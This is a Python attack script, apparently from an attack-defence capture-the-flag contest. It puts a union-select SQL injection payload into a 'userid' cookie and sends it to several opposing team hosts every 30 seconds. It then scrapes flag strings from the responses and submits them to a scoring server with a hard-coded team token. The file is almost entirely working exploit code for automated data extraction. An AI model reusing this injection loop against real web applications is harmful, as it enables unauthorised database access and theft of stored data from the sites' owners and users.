import requests
import re
import json
import time


def get(n):
    return 'http://10.60.' + str(n) + '.2/'


token = '287945df-40f6-4047-b85d-e486eecc5e21'


def submit(flags):
    return json.loads(
        requests.put('http://10.60.6.10:8080/flags', headers={'X-Team-Token': token}, data=json.dumps(flags)).text)


cookies = {'nonce': '691e431a19347337a22ba906e10490fa', 'sign': '3eb4b52ae47c1083dd7e469497658c9e',
           'userid': '-1 union select group_concat(full) from posts --'}

while True:
    for i in range(2, 7):
        r = requests.get(get(i), cookies=cookies)
        # print(r.text)
        t = re.findall(r'[A-Z0-9]{31}=', r.text)
        if t:
            print(i, 'Hacked!')
            print(submit(t))
        # print(i, t)
        # for flag in t:
        #     print(submit(flag))
    time.sleep(30)
